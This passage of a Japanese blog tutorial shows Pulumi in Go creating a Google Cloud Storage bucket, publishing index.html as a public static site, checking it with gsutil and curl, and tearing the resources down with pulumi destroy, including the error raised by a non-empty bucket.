class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;github.com/pulumi/pulumi-gcp/sdk/v6/go/gcp/storage&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/pulumi/pulumi/sdk/v3/go/pulumi&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">pulumi.Run(<span class="function"><span class="keyword">func</span><span class="params">(ctx *pulumi.Context)</span></span> <span class="type">error</span> &#123;</span><br><span class="line"><span class="comment">// Create a GCP resource (Storage Bucket)</span></span><br><span class="line">bucket, err := storage.NewBucket(ctx, <span class="string">&quot;my-bucket&quot;</span>, &amp;storage.BucketArgs&#123;</span><br><span class="line">Location: pulumi.String(<span class="string">&quot;US&quot;</span>),</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Export the DNS name of the bucket</span></span><br><span class="line">ctx.Export(<span class="string">&quot;bucketName&quot;</span>, bucket.Url)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="リソースの作成"><a href="#リソースの作成" class="headerlink" title="リソースの作成"></a>リソースの作成</h2><p>上記の内容でPulumiを実行してGoogle Cloudのリソースを作成します。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pulumi up</span><br></pre></td></tr></table></figure><p>上記のコマンドを実行すると、Goのプログラムを評価し、実行するリソースの更新を決定します。変更の概要を示すプレビューが表示されます。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">Previewing update (dev)</span><br><span class="line"></span><br><span class="line">View <span class="keyword">in</span> Browser (Ctrl+O): https://app.pulumi.com/xxxxxxxx/gcp-test/dev/previews/xxxxxxxxxxxxxx</span><br><span class="line"></span><br><span class="line">Downloading plugin: 47.96 MiB / 47.96 MiB [=========================] 100.00% 2s</span><br><span class="line">                                                                                [resource plugin gcp-6.52.0] installing</span><br><span class="line">     Type                   Name          Plan</span><br><span class="line"> +   pulumi:pulumi:Stack    gcp-test-dev  create</span><br><span class="line"> +   └─ gcp:storage:Bucket  my-bucket     create</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Outputs:</span><br><span class="line">    bucketName: output&lt;string&gt;</span><br><span class="line"></span><br><span class="line">Resources:</span><br><span class="line">    + 2 to create</span><br><span class="line"></span><br><span class="line">Do you want to perform this update?  [Use arrows to move, <span class="built_in">type</span> to filter]</span><br><span class="line">  <span class="built_in">yes</span></span><br><span class="line">&gt; no</span><br><span class="line">  details</span><br></pre></td></tr></table></figure><p><code>details</code>を選択すると、変更内容の詳細な差分が表示されます。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Do you want to perform this update? details</span><br><span class="line">+ pulumi:pulumi:Stack: (create)</span><br><span class="line">    [urn=urn:pulumi:dev::gcp-test::pulumi:pulumi:Stack::gcp-test-dev]</span><br><span class="line">    + gcp:storage/bucket:Bucket: (create)</span><br><span class="line">        [urn=urn:pulumi:dev::gcp-test::gcp:storage/bucket:Bucket::my-bucket]</span><br><span class="line">        forceDestroy: <span class="literal">false</span></span><br><span class="line">        location    : <span class="string">&quot;US&quot;</span></span><br><span class="line">        name        : <span class="string">&quot;my-bucket-f077c87&quot;</span></span><br><span class="line">        storageClass: <span class="string">&quot;STANDARD&quot;</span></span><br><span class="line">    --outputs:--</span><br><span class="line">    bucketName: output&lt;string&gt;</span><br></pre></td></tr></table></figure><p><code>yes</code>を選択するとGoogle Cloud に新しいストレージ バケットが作成されます。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Do you want to perform this update? <span class="built_in">yes</span></span><br><span class="line">Updating (dev)</span><br><span class="line"></span><br><span class="line">View <span class="keyword">in</span> Browser (Ctrl+O): https://app.pulumi.com/xxxxxxxx/gcp-test/dev/updates/1</span><br><span class="line"></span><br><span class="line">     Type                   Name          Status</span><br><span class="line"> +   pulumi:pulumi:Stack    gcp-test-dev  created (3s)</span><br><span class="line"> +   └─ gcp:storage:Bucket  my-bucket     created (1s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Outputs:</span><br><span class="line">    bucketName: <span class="string">&quot;gs://my-bucket-0cae339&quot;</span></span><br><span class="line"></span><br><span class="line">Resources:</span><br><span class="line">    + 2 created</span><br><span class="line"></span><br><span class="line">Duration: 5s</span><br></pre></td></tr></table></figure><p>Google Cloudのコンソール画面からCloud Storageを確認すると、バケットが作成されていることが確認できました。<br><img src="/images/20230426a/image_11.png" alt="" width="1200" height="631" loading="lazy"></p><p>スタックのアウトプットを確認したい場合は、以下のコマンドを実行すると確認することができます。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ pulumi stack output bucketName</span><br><span class="line">gs://my-bucket-0cae339</span><br></pre></td></tr></table></figure><p>また、自身のPulumi Cloudのアカウントを確認しに行くと以下のように、Web上でもリソースの状態を確認することができます。</p><img src="/images/20230426a/image_12.png" alt="" width="1200" height="670" loading="lazy"><h1 id="リソースの変更"><a href="#リソースの変更" class="headerlink" title="リソースの変更"></a>リソースの変更</h1><p>GCSバケットを作成することができたので、バケットにオブジェクトを追加してみます。<br>作業ディレクトリに<code>index.html</code>を追加します。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello, Pulumi!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>main.goにオブジェクトを追加するコード<code>コメントアウト部分：Add index.html Object</code>を追加します。</p><figure class="highlight go"><figcaption><span>main.go</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;github.com/pulumi/pulumi-gcp/sdk/v6/go/gcp/storage&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/pulumi/pulumi/sdk/v3/go/pulumi&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">pulumi.Run(<span class="function"><span class="keyword">func</span><span class="params">(ctx *pulumi.Context)</span></span> <span class="type">error</span> &#123;</span><br><span class="line"><span class="comment">// Create a GCP resource (Storage Bucket)</span></span><br><span class="line">bucket, err := storage.NewBucket(ctx, <span class="string">&quot;my-bucket&quot;</span>, &amp;storage.BucketArgs&#123;</span><br><span class="line">Location: pulumi.String(<span class="string">&quot;US&quot;</span>),</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Add index.html Object</span></span><br><span class="line">bucketObject, err := storage.NewBucketObject(ctx, <span class="string">&quot;index.html&quot;</span>, &amp;storage.BucketObjectArgs&#123;</span><br><span class="line">Bucket: bucket.Name,</span><br><span class="line">Source: pulumi.NewFileAsset(<span class="string">&quot;index.html&quot;</span>),</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Export the DNS name of the bucket</span></span><br><span class="line">ctx.Export(<span class="string">&quot;bucketName&quot;</span>, bucket.Url)</span><br><span class="line">ctx.Export(<span class="string">&quot;ObjectName&quot;</span>, bucketObject.Name)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>main.goの修正が完了したので、変更分をデプロイしていきましょう。<br>再度<code>pulumi up</code>を実行します。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$ pulumi up</span><br><span class="line">Previewing update (dev)</span><br><span class="line"></span><br><span class="line">View <span class="keyword">in</span> Browser (Ctrl+O): https://app.pulumi.com/xxxxxx/gcp-test/dev/previews/xxxxxxxxxxxxxxxx</span><br><span class="line"></span><br><span class="line">     Type                         Name          Plan</span><br><span class="line">     pulumi:pulumi:Stack          gcp-test-dev</span><br><span class="line"> +   └─ gcp:storage:BucketObject  index.html    create</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Outputs:</span><br><span class="line">  + ObjectName: <span class="string">&quot;index.html-6b14a12&quot;</span></span><br><span class="line"></span><br><span class="line">Resources:</span><br><span class="line">    + 1 to create</span><br><span class="line">    2 unchanged</span><br><span class="line"></span><br><span class="line">Do you want to perform this update?  [Use arrows to move, <span class="built_in">type</span> to filter]</span><br><span class="line">&gt; <span class="built_in">yes</span></span><br><span class="line">  no</span><br><span class="line">  details</span><br></pre></td></tr></table></figure><p><code>yes</code>を入力します。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Do you want to perform this update? <span class="built_in">yes</span></span><br><span class="line">Updating (dev)</span><br><span class="line"></span><br><span class="line">View <span class="keyword">in</span> Browser (Ctrl+O): https://app.pulumi.com/xxxxxxx/gcp-test/dev/updates/2</span><br><span class="line"></span><br><span class="line">     Type                         Name          Status</span><br><span class="line">     pulumi:pulumi:Stack          gcp-test-dev</span><br><span class="line"> +   └─ gcp:storage:BucketObject  index.html    created (0.74s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Outputs:</span><br><span class="line">  + ObjectName: <span class="string">&quot;index.html-5c30f0c&quot;</span></span><br><span class="line">    bucketName: <span class="string">&quot;gs://my-bucket-0cae339&quot;</span></span><br><span class="line"></span><br><span class="line">Resources:</span><br><span class="line">    + 1 created</span><br><span class="line">    2 unchanged</span><br><span class="line"></span><br><span class="line">Duration: 3s</span><br></pre></td></tr></table></figure><p>更新作業が完了したので、<code>gsutilコマンド</code>でオブジェクトのアップロードを確認します。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ gsutil <span class="built_in">ls</span> $(pulumi stack output bucketName)</span><br><span class="line">gs://my-bucket-0cae339/index.html-5c30f0c</span><br></pre></td></tr></table></figure><p>オブジェクトがアップロードできていることが確認できました。</p><p><code>index.html</code> がバケットにあるので、main.goを変更して、バケットが <code>index.html</code> を静的 Web サイトとして機能するように設定します。</p><p>変更内容は以下になります。</p><ul><li>websiteバケットにプロパティを設定します。</li><li>Google Cloud Storage の推奨事項に合わせて、バケットに対する均一なバケットレベルのアクセスをtrueに設定します。</li><li>バケットのコンテンツをインターネット経由でアクセスできるようにします。</li><li>オブジェクトのコンテンツタイプ<code>text/html</code>に変更して、HTMLとして提供されるようにします。</li><li>バケットのエンドポイントURLをエクスポートします。</li></ul><p><code>コメントアウト：//Settings for publishing content to the Internet</code>が修正部分になります。</p><figure class="highlight go"><figcaption><span>main.go</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;github.com/pulumi/pulumi-gcp/sdk/v6/go/gcp/storage&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/pulumi/pulumi/sdk/v3/go/pulumi&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">pulumi.Run(<span class="function"><span class="keyword">func</span><span class="params">(ctx *pulumi.Context)</span></span> <span class="type">error</span> &#123;</span><br><span class="line"><span class="comment">// Create a GCP resource (Storage Bucket)</span></span><br><span class="line">bucket, err := storage.NewBucket(ctx, <span class="string">&quot;my-bucket&quot;</span>, &amp;storage.BucketArgs&#123;</span><br><span class="line">Location: pulumi.String(<span class="string">&quot;US&quot;</span>),</span><br><span class="line"><span class="comment">// Settings for publishing content to the Internet</span></span><br><span class="line">Website: storage.BucketWebsiteArgs&#123;</span><br><span class="line">MainPageSuffix: pulumi.String(<span class="string">&quot;index.html&quot;</span>),</span><br><span class="line">&#125;,</span><br><span class="line">UniformBucketLevelAccess: pulumi.Bool(<span class="literal">true</span>),</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Add index.html Object</span></span><br><span class="line">bucketObject, err := storage.NewBucketObject(ctx, <span class="string">&quot;index.html&quot;</span>, &amp;storage.BucketObjectArgs&#123;</span><br><span class="line">Bucket: bucket.Name,</span><br><span class="line">ContentType: pulumi.String(<span class="string">&quot;text/html&quot;</span>), <span class="comment">// Settings for publishing content to the Internet</span></span><br><span class="line">Source: pulumi.NewFileAsset(<span class="string">&quot;index.html&quot;</span>),</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Settings for publishing content to the Internet</span></span><br><span class="line">_, err = storage.NewBucketIAMBinding(ctx, <span class="string">&quot;my-bucket-IAMBinding&quot;</span>, &amp;storage.BucketIAMBindingArgs&#123;</span><br><span class="line">Bucket: bucket.Name,</span><br><span class="line">Role:   pulumi.String(<span class="string">&quot;roles/storage.objectViewer&quot;</span>),</span><br><span class="line">Members: pulumi.StringArray&#123;</span><br><span class="line">pulumi.String(<span class="string">&quot;allUsers&quot;</span>),</span><br><span class="line">&#125;,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Export the DNS name of the bucket</span></span><br><span class="line">ctx.Export(<span class="string">&quot;bucketName&quot;</span>, bucket.Url)</span><br><span class="line">ctx.Export(<span class="string">&quot;ObjectName&quot;</span>, bucketObject.Name)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Settings for publishing content to the Internet</span></span><br><span class="line">bucketEndpoint := pulumi.Sprintf(<span class="string">&quot;http://storage.googleapis.com/%s/%s&quot;</span>, bucket.Name, bucketObject.Name)</span><br><span class="line">ctx.Export(<span class="string">&quot;bucketEndpoint&quot;</span>, bucketEndpoint)</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>main.goの設定が完了しましたので、<code>pulumi up</code>を実行し<code>yes</code>を選択しデプロイします。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$ pulumi up</span><br><span class="line">Previewing update (dev)</span><br><span class="line"></span><br><span class="line">View <span class="keyword">in</span> Browser (Ctrl+O): https://app.pulumi.com/xxxxxxx/gcp-test/dev/previews/xxxxxxxxxxxxxx</span><br><span class="line"></span><br><span class="line">     Type                             Name                  Plan        Info</span><br><span class="line">     pulumi:pulumi:Stack              gcp-test-dev</span><br><span class="line"> ~   ├─ gcp:storage:Bucket            my-bucket             update      [diff: +website~uniformBucketLevelAccess]</span><br><span class="line"> +   ├─ gcp:storage:BucketIAMBinding  my-bucket-IAMBinding  create</span><br><span class="line"> +-  └─ gcp:storage:BucketObject      index.html            replace     [diff: ~contentType]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Outputs:</span><br><span class="line">  ~ ObjectName    : <span class="string">&quot;index.html-5c30f0c&quot;</span> =&gt; <span class="string">&quot;index.html-0bac7da&quot;</span></span><br><span class="line">  + bucketEndpoint: <span class="string">&quot;http://storage.googleapis.com/my-bucket-0cae339/index.html-0bac7da&quot;</span></span><br><span class="line"></span><br><span class="line">Resources:</span><br><span class="line">    + 1 to create</span><br><span class="line">    ~ 1 to update</span><br><span class="line">    +-1 to replace</span><br><span class="line">    3 changes. 1 unchanged</span><br><span class="line"></span><br><span class="line">Do you want to perform this update?  [Use arrows to move, <span class="built_in">type</span> to filter]</span><br><span class="line">&gt; <span class="built_in">yes</span></span><br><span class="line">  no</span><br><span class="line">  details</span><br></pre></td></tr></table></figure><p>デプロイが完了しましたので、<code>curlコマンド</code>を実行し、バケットエンドポイントへアクセスします。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ curl $(pulumi stack output bucketEndpoint)</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;h1&gt;Hello, Pulumi!&lt;/h1&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>オブジェクトを取得することができました。<br>ChromeでアクセスするとWebブラウザ上でindex.htmlの内容が表示されることも確認することができました。</p><img src="/images/20230426a/image_13.png" alt="" width="296" height="57" loading="lazy"><h2 id="リソースの削除"><a href="#リソースの削除" class="headerlink" title="リソースの削除"></a>リソースの削除</h2><p>それでは作成したリソースたちを削除していきます。<br>リソースの一括削除もできることもIaCのいいところですね。（本番環境では注意です。）</p><p><code>pulumi destroy</code>を実行します。<br>リソースを本当に削除するかどうかを確認するプロンプトが表示されます。問題なければ<code>yes</code>を選択し、リソースが削除されるまで待機します。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">$ pulumi destroy</span><br><span class="line">Previewing destroy (dev)</span><br><span class="line"></span><br><span class="line">View <span class="keyword">in</span> Browser (Ctrl+O): https://app.pulumi.com/xxxxxxxxx/gcp-test/dev/previews/xxxxxxxxxxx</span><br><span class="line"></span><br><span class="line">     Type                             Name                  Plan</span><br><span class="line"> -   pulumi:pulumi:Stack              gcp-test-dev          delete</span><br><span class="line"> -   ├─ gcp:storage:BucketIAMBinding  my-bucket-IAMBinding  delete</span><br><span class="line"> -   ├─ gcp:storage:BucketObject      index.html            delete</span><br><span class="line"> -   └─ gcp:storage:Bucket            my-bucket             delete</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Outputs:</span><br><span class="line">  - ObjectName    : <span class="string">&quot;index.html-debb576&quot;</span></span><br><span class="line">  - bucketEndpoint: <span class="string">&quot;http://storage.googleapis.com/my-bucket-0cae339/index.html-debb576&quot;</span></span><br><span class="line">  - bucketName    : <span class="string">&quot;gs://my-bucket-0cae339&quot;</span></span><br><span class="line"></span><br><span class="line">Resources:</span><br><span class="line">    - 4 to delete</span><br><span class="line"></span><br><span class="line">Do you want to perform this destroy?  [Use arrows to move, <span class="built_in">type</span> to filter]</span><br><span class="line">&gt; <span class="built_in">yes</span></span><br><span class="line">  no</span><br><span class="line">  details</span><br></pre></td></tr></table></figure><p>なぜか、バケットが削除されなくてエラーになりました。</p><p>pulumi上からオブジェクトは削除されていましたが、Google Cloudのコンソール画面を見るとオブジェクトが削除されていませんでした。。。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Do you want to perform this destroy? <span class="built_in">yes</span></span><br><span class="line">Destroying (dev)</span><br><span class="line"></span><br><span class="line">View <span class="keyword">in</span> Browser (Ctrl+O): https://app.pulumi.com/xxxxxxxx/gcp-test/dev/updates/5</span><br><span class="line"></span><br><span class="line">     Type                             Name                  Status                  Info</span><br><span class="line">     pulumi:pulumi:Stack              gcp-test-dev          **failed**              1 error</span><br><span class="line"> -   ├─ gcp:storage:BucketIAMBinding  my-bucket-IAMBinding  deleted (6s)</span><br><span class="line"> -   ├─ gcp:storage:BucketObject      index.html            deleted (0.90s)</span><br><span class="line"> -   └─ gcp:storage:Bucket            my-bucket             **deleting failed**     1 error</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Diagnostics:</span><br><span class="line">  pulumi:pulumi:Stack (gcp-test-dev):</span><br><span class="line">    error: update failed</span><br><span class="line"></span><br><span class="line">  gcp:storage:Bucket (my-bucket):</span><br><span class="line">    error: deleting urn:pulumi:dev::gcp-test::gcp:storage/bucket:Bucket::my-bucket: 1 error occurred:</span><br><span class="line">        * Error trying to delete bucket my-bucket-0cae339 containing objects without `force_destroy` <span class="built_in">set</span> to <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">Resources:</span><br><span class="line">    - 2 deleted</span><br><span class="line"></span><br><span class="line">Duration: 8s</span><br></pre></td></tr></table></figure><p>Google Cloudのコンソール画面から手動でオブジェクトを削除し、再度<code>pulumi destroy</code>を実行します。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">$ pulumi destroy</span><br><span class="line">Previewing destroy (dev)</span><br><span class="line"></span><br><span class="line">View <span class="keyword">in</span> Browser (Ctrl+O): https://app.pulumi.com/xxxxxxxxx/gcp-test/dev/previews/xxxxxxxxxxxxxxxx</span><br><span class="line"></span><br><span class="line">     Type                   Name          Plan</span><br><span class="line"> -   pulumi:pulumi:Stack    gcp-test-dev  delete</span><br><span class="line"> -   └─ gcp:storage:Bucket  my-bucket     delete</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Outputs:</span><br><span class="line">  - ObjectName    : <span class="string">&quot;index.html-debb576&quot;</span></span><br><span class="line">  - bucketEndpoint: <span class="string">&quot;http://storage.googleapis.com/my-bucket-0cae339/index.html-debb576&quot;</span></span><br><span class="line">  - bucketName    : <span class="string">&quot;gs://my-bucket-0cae339&quot;</span></span><br><span class="line"></span><br><span class="line">Resources:</span><br><span class="line">    - 2 to delete</span><br><span class="line"></span><br><span class="line">Do you want to perform this destroy? <span class="built_in">yes</span></span><br><span class="line">Destroying (dev)</span><br><span class="line"></span><br><span class="line">View <span class="keyword">in</span> Browser (Ctrl+O): https://app.pulumi.com/xxxxxxxxxxxx/gcp-test/dev/updates/9</span><br><span class="line"></span><br><span class="line">     Type                   Name          Status</span><br><span class="line"> -   pulumi:pulumi:Stack    gcp-test-dev  deleted</span><br><span 